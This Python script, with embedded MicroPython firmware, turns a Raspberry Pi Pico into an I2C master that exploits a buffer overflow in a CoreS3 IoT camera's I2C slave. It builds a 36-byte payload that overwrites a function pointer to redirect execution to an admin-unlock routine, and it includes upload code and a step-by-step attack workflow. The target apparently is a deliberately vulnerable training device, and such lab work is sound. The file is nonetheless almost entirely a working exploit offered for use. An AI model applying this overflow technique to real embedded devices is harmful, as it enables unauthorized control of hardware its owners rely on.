#!/usr/bin/env python3
"""
Raspberry Pi Pico MicroPython I2C Master / Overflow Exploit

MicroPython firmware for a Raspberry Pi Pico that acts as an I2C master to
send an overflow payload to the CoreS3 I2C slave at address 0x55 on Port.A.
The payload is 36 bytes: 32 bytes of padding followed by a 4-byte function
pointer that overwrites the callback, redirecting execution to the
i2c_admin_unlock() function.

This replaces a second ESP32 dev board (~$10-15) with a Raspberry Pi Pico
(~$4) for the I2C spoofing attack.

Hardware connections:
  Pico GP14 (I2C1 SDA) -> CoreS3 GPIO2 (SDA, Port.A Grove red connector)
  Pico GP15 (I2C1 SCL) -> CoreS3 GPIO1 (SCL, Port.A Grove red connector)
  Pico GND             -> CoreS3 GND

IMPORTANT: Both devices operate at 3.3V logic levels. No level shifter
is needed. The CoreS3 has internal pull-ups on Port.A.

Usage examples:

  # Display the MicroPython firmware to copy-paste into Thonny
  ./pico_i2c_master.py --show-firmware

  # Upload firmware to Pico via serial
  ./pico_i2c_master.py --upload --pico-port /dev/ttyACM1

  # Send the overflow exploit with target address
  ./pico_i2c_master.py --exploit --pico-port /dev/ttyACM1 --address 0x42007A00

  # Scan the I2C bus for devices
  ./pico_i2c_master.py --exploit --pico-port /dev/ttyACM1 --scan-only
"""

import argparse
import sys
import time


# ---------------------------------------------------------------------------
# MicroPython firmware source for the Raspberry Pi Pico
# ---------------------------------------------------------------------------
PICO_FIRMWARE = r'''
# pico_i2c_master.py - Raspberry Pi Pico MicroPython
# I2C master for sending overflow payload to CoreS3 I2C slave
#
# Connections:
#   GP14 (I2C1 SDA) -> CoreS3 GPIO2 (SDA, Port.A)
#   GP15 (I2C1 SCL) -> CoreS3 GPIO1 (SCL, Port.A)
#   GND              -> CoreS3 GND
#
# Commands over USB serial (115200 baud):
#   scan                         - Scan I2C bus for devices
#   send <addr_hex>              - Send overflow payload with target address
#   read <slave_addr> <nbytes>   - Read N bytes from a slave device
#   status                       - Report I2C configuration
#   help                         - Show available commands
#
# The overflow payload is 36 bytes:
#   Bytes 0-31:  Padding (0x41 = 'A')
#   Bytes 32-35: Target function address (little-endian)
#
# This overwrites the function pointer at offset 32 in the slave's
# 32-byte receive buffer, redirecting execution to the target function.

import machine
import time
import sys
import struct

# Pin configuration
SDA_PIN = 14    # GP14 - I2C1 SDA, connected to CoreS3 GPIO2 (Port.A SDA)
SCL_PIN = 15    # GP15 - I2C1 SCL, connected to CoreS3 GPIO1 (Port.A SCL)

# I2C slave address on CoreS3
SLAVE_ADDR = 0x55

# I2C frequency (100 kHz standard mode)
I2C_FREQ = 100000

# Initialize I2C1 as master
i2c = machine.I2C(1, sda=machine.Pin(SDA_PIN), scl=machine.Pin(SCL_PIN), freq=I2C_FREQ)


def cmd_scan():
    """Scan the I2C bus and report all devices found."""
    print("Scanning I2C bus (SDA=GP%d, SCL=GP%d)..." % (SDA_PIN, SCL_PIN))
    devices = i2c.scan()
    if devices:
        print("Found %d device(s):" % len(devices))
        for addr in devices:
            marker = " <-- target slave" if addr == SLAVE_ADDR else ""
            print("  0x%02X (%d)%s" % (addr, addr, marker))
    else:
        print("No devices found. Check wiring and ensure slave is initialized.")
        print("Hint: Run 'diag 16' on CoreS3 serial console first.")
    return devices


def cmd_send(target_addr_str):
    """Build and send the overflow payload to the I2C slave.

    Args:
        target_addr_str: Target function address as hex string (e.g., '0x42007A00')
    """
    try:
        target_addr = int(target_addr_str, 16)
    except ValueError:
        print("ERROR: Invalid address format. Use hex like 0x42007A00")
        return

    # Verify slave is present
    devices = i2c.scan()
    if SLAVE_ADDR not in devices:
        print("ERROR: Slave 0x%02X not found on I2C bus." % SLAVE_ADDR)
        print("Found: %s" % ", ".join("0x%02X" % d for d in devices) if devices else "none")
        print("Hint: Run 'diag 16' on CoreS3 serial console first.")
        return

    # Build the overflow payload
    # 32 bytes padding + 4 bytes target address (little-endian)
    padding = b'A' * 32
    addr_bytes = struct.pack('<I', target_addr)
    payload = padding + addr_bytes

    print("Target slave: 0x%02X" % SLAVE_ADDR)
    print("Payload size: %d bytes (32 padding + 4 address)" % len(payload))
    print("Target address: 0x%08X" % target_addr)
    print("Payload hex: %s" % " ".join("%02X" % b for b in payload))
    print()
    print("Sending payload...")

    try:
        i2c.writeto(SLAVE_ADDR, payload)
        print("Payload sent successfully.")
        print("Check CoreS3 for green screen flash and victory melody.")
    except OSError as e:
        print("ERROR: I2C write failed: %s" % e)
        print("The slave may have NACKed the extra bytes (expected for overflow).")
        print("Check CoreS3 serial output for results.")


def cmd_read(slave_addr_str, nbytes_str):
    """Read bytes from an I2C slave device."""
    try:
        slave_addr = int(slave_addr_str, 16)
        nbytes = int(nbytes_str)
    except ValueError:
        print("Usage: read <slave_addr_hex> <num_bytes>")
        return

    try:
        data = i2c.readfrom(slave_addr, nbytes)
        print("Read %d bytes from 0x%02X:" % (len(data), slave_addr))
        print("  Hex: %s" % " ".join("%02X" % b for b in data))
        ascii_str = "".join(chr(b) if 0x20 <= b <= 0x7E else "." for b in data)
        print("  ASCII: %s" % ascii_str)
    except OSError as e:
        print("ERROR: I2C read failed: %s" % e)


def cmd_status():
    """Report I2C configuration."""
    print("I2C Master: SDA=GP%d, SCL=GP%d, freq=%d Hz" % (SDA_PIN, SCL_PIN, I2C_FREQ))
    print("Target slave: 0x%02X" % SLAVE_ADDR)
    devices = i2c.scan()
    print("Devices on bus: %s" % (
        ", ".join("0x%02X" % d for d in devices) if devices else "none"))


def cmd_help():
    """Print available commands."""
    print("Pico I2C Master / Overflow Exploit")
    print("Commands:")
    print("  scan                        - Scan I2C bus for devices")
    print("  send <target_addr_hex>      - Send overflow payload (e.g., send 0x42007A00)")
    print("  read <slave_addr> <nbytes>  - Read N bytes from slave")
    print("  status                      - Show I2C configuration")
    print("  help                        - Show this help")
    print()
    print("Example workflow:")
    print("  1. On CoreS3 serial: run 'diag 16' to init I2C slave")
    print("  2. On Pico: 'scan' to verify 0x55 is visible")
    print("  3. On Pico: 'send 0x42007A00' to send overflow payload")


def main():
    print("PICO_I2C_MASTER_READY")
    print("I2C master on SDA=GP%d, SCL=GP%d" % (SDA_PIN, SCL_PIN))
    print("Type 'help' for commands.")

    while True:
        try:
            line = input().strip()
        except EOFError:
            break

        if not line:
            continue

        parts = line.split()
        cmd = parts[0].lower()

        if cmd == "help":
            cmd_help()
        elif cmd == "scan":
            cmd_scan()
        elif cmd == "send":
            if len(parts) < 2:
                print("Usage: send <target_addr_hex>  (e.g., send 0x42007A00)")
            else:
                cmd_send(parts[1])
        elif cmd == "read":
            if len(parts) < 3:
                print("Usage: read <slave_addr_hex> <num_bytes>")
            else:
                cmd_read(parts[1], parts[2])
        elif cmd == "status":
            cmd_status()
        else:
            print("Unknown command: %s (type 'help')" % cmd)


main()
'''


def show_firmware():
    """Print the MicroPython firmware source for copy-paste deployment."""
    print("[*] MicroPython I2C master/exploit firmware for Raspberry Pi Pico")
    print("[*] Copy this code to main.py on your Pico")
    print("=" * 60)
    print(PICO_FIRMWARE)
    print("=" * 60)


def upload_firmware(pico_port):
    """Upload the firmware to a Pico over serial using raw REPL."""
    try:
        import serial
    except ImportError:
        print("[ERROR] pyserial is required: pip install pyserial")
        sys.exit(1)

    print("[*] Connecting to Pico on %s..." % pico_port)
    ser = serial.Serial(pico_port, 115200, timeout=2)
    time.sleep(0.5)

    # Enter raw REPL mode
    ser.write(b"\x03\x03")
    time.sleep(0.3)
    ser.write(b"\x01")
    time.sleep(0.5)
    ser.read(ser.in_waiting)

    script = "f = open('main.py', 'w')\n"
    for line in PICO_FIRMWARE.split("\n"):
        escaped = line.replace("\\", "\\\\").replace("'", "\\'")
        script += "f.write('%s\\n')\n" % escaped
    script += "f.close()\n"
    script += "print('I2C master firmware written to main.py')\n"

    ser.write(script.encode())
    ser.write(b"\x04")
    time.sleep(2)

    response = ser.read(ser.in_waiting).decode(errors="replace")
    if "firmware written" in response.lower():
        print("[+] Firmware uploaded successfully")
    else:
        print("[!] Upload may have failed. Response:")
        print(response)

    ser.write(b"\x02")
    time.sleep(0.2)
    ser.write(b"\x04")
    ser.close()
    print("[*] Pico will restart and run the I2C master firmware")


def run_exploit(pico_port, target_address, scan_only):
    """Send commands to the Pico to execute the I2C overflow exploit."""
    try:
        import serial
    except ImportError:
        print("[ERROR] pyserial is required: pip install pyserial")
        sys.exit(1)

    print("[*] Connecting to Pico on %s..." % pico_port)
    ser = serial.Serial(pico_port, 115200, timeout=5)
    time.sleep(1)
    ser.reset_input_buffer()

    # Wait for ready banner
    deadline = time.time() + 5
    ready = False
    while time.time() < deadline:
        raw = ser.readline()
        if raw and b"PICO_I2C_MASTER_READY" in raw:
            ready = True
            break
    if not ready:
        print("[!] Did not see ready banner (Pico may already be running)")

    # Step 1: Scan the bus
    print("[*] Scanning I2C bus...")
    ser.write(b"scan\n")
    time.sleep(1)
    while ser.in_waiting:
        line = ser.readline().decode(errors="replace").strip()
        if line:
            print("    %s" % line)

    if scan_only:
        ser.close()
        return

    # Step 2: Send the overflow payload
    if not target_address:
        print("[!] No target address specified. Use --address 0x42007A00")
        print("[*] Find the address with: xtensa-esp32s3-elf-nm firmware.elf | grep i2c_admin_unlock")
        ser.close()
        return

    print()
    print("[*] Sending overflow payload with target address %s..." % target_address)
    cmd = "send %s\n" % target_address
    ser.write(cmd.encode())
    time.sleep(2)

    while ser.in_waiting:
        line = ser.readline().decode(errors="replace").strip()
        if line:
            print("    %s" % line)

    ser.close()
    print()
    print("[*] Exploit sent. Check the CoreS3 for:")
    print("    - Green screen flash")
    print("    - Victory melody from speaker")
    print("    - Serial output confirming admin unlock")


def main():
    parser = argparse.ArgumentParser(
        description="Raspberry Pi Pico I2C master for sending overflow payloads to the "
                    "CoreS3 IoT camera's I2C slave. Replaces a second ESP32 dev board "
                    "with a ~$4 Pico for the I2C buffer overflow attack.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""examples:
  %(prog)s --show-firmware
  %(prog)s --upload --pico-port /dev/ttyACM1
  %(prog)s --exploit --pico-port /dev/ttyACM1 --scan-only
  %(prog)s --exploit --pico-port /dev/ttyACM1 --address 0x42007A00

workflow:
  1. Upload firmware:  %(prog)s --upload --pico-port /dev/ttyACM1
  2. On CoreS3 serial: run 'diag 16' to initialize I2C slave on Port.A
  3. Scan bus:         %(prog)s --exploit --pico-port /dev/ttyACM1 --scan-only
  4. Find address:     xtensa-esp32s3-elf-nm firmware.elf | grep i2c_admin_unlock
  5. Send exploit:     %(prog)s --exploit --pico-port /dev/ttyACM1 --address 0x42007A00
""",
    )

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument(
        "--show-firmware",
        action="store_true",
        help="Display the MicroPython firmware source for manual deployment",
    )
    mode.add_argument(
        "--upload",
        action="store_true",
        help="Upload the I2C master firmware to a Pico via raw REPL over serial",
    )
    mode.add_argument(
        "--exploit",
        action="store_true",
        help="Run the I2C overflow exploit via the Pico",
    )

    parser.add_argument(
        "--pico-port",
        default="/dev/ttyACM1",
        help="Serial port for the Raspberry Pi Pico (default: /dev/ttyACM1)",
    )
    parser.add_argument(
        "--address",
        help="Target function address in hex (e.g., 0x42007A00) for the overflow",
    )
    parser.add_argument(
        "--scan-only",
        action="store_true",
        help="Only scan the I2C bus, do not send the exploit payload",
    )

    args = parser.parse_args()

    if args.show_firmware:
        show_firmware()
    elif args.upload:
        upload_firmware(args.pico_port)
    elif args.exploit:
        run_exploit(args.pico_port, args.address, args.scan_only)


if __name__ == "__main__":
    main()
